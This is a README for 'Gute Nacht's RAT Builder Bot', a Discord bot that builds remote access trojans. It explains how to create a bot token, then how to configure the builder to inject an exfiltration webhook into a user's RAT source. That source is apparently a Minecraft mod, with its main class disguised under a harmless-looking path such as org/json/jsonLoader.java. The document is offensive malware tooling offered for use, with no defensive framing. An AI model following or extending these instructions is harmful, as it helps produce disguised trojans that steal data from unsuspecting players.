<h1>Gute Nacht's RAT Builder Bot</h1>

# Setting up your bot
1.) Visit [Discord's Developer Portal](https://discord.com/developers/applications) (If it takes you to a login screen, log into your Discord and revisit the page)

2.) Click the "New Application" button on the top right of your screen, choose the name of the application, agree to the terms and click "Create".

3.) Click "Bot" on the left settings sidebar and click "Add bot" (you may rename it and set a profile picture for it if you'd like)

4.) Press "Reset Token" and "Yes, do it!", then copy the token by copying it manually or pressing the "Copy" button.

5.) Open the "config.json" file and add your bot's token to the "token" field

# Now you need a RAT 
If you already have one, that's good! If you don't, I don't know what to tell you. Make one I guess?

1.) Open your rat's mdk and nagivate to src/main/java and then find your main class path. For me its' org/json/jsonLoader.java (the .java is necessary)

2.) go back to your mdk and find your build.gradle, then find "archivesBaseName" and write the name in the "exportname" field
  
3.) You need to open the code for your rat, and find which line the webhook is meant to be placed. After that put the line number into config.json in the "line"

4.) Go into your main class and find the name of the string where the webhook is expected (string name will be bold) like: String **pb** = "https://discord.com/api/...". IT MUST BE JUST THE NAME, NOTHING ELSE.


# HOW TO USE
1.) Download the respository and check "config.json" 
